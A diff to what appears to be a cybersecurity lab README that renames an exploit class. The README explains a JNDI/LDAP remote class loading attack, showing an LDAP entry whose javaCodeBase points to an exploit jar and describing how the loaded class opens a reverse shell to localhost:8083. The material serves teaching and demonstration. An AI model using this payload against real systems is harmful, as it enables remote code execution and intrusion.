@@ -46,14 +46,14 @@ objectclass: javaContainer
 objectclass: javaObject
 objectclass: javaNamingReference
 javaCodeBase: http://localhost:8080/rce/rce-exploit-0.0.1-SNAPSHOT.jar
-javaClassName: uk.ac.jisc.cybersec.rce.RceExploit
-javaFactory: uk.ac.jisc.cybersec.rce.RceExploit
+javaClassName: uk.ac.jisc.cybersec.rce.RceReverseShellExploit
+javaFactory: uk.ac.jisc.cybersec.rce.RceReverseShellExploit
 cn: Java Class
 sn: Class
 uid: java-ref
 ```
 
-The URLClassLoader will lookup the `uk.ac.jisc.cybersec.rce.RceExploit` class firstly from the local classpath — where it does not exist — then from the URL codebase provided by the LDAP entry (e.g. remotely via HTTP at `http://localhost:8080/rce/rce-exploit-0.0.1-SNAPSHOT.jar`). This downloads the referenced `jar` file, and instantiates `uk.ac.jisc.cybersec.rce.RceExploit`, triggering the static method shown below. The malicious code attempts to establish a reverse shell to anything listening on port *8083* on *localhost*:
+The URLClassLoader will lookup the `uk.ac.jisc.cybersec.rce.RceReverseShellExploit` class firstly from the local classpath — where it does not exist — then from the URL codebase provided by the LDAP entry (e.g. remotely via HTTP at `http://localhost:8080/rce/rce-exploit-0.0.1-SNAPSHOT.jar`). This downloads the referenced `jar` file, and instantiates `uk.ac.jisc.cybersec.rce.RceReverseShellExploit`, triggering the static method shown below. The malicious code attempts to establish a reverse shell to anything listening on port *8083* on *localhost*:
 
 ```java
 package uk.ac.jisc.cybersec.rce;
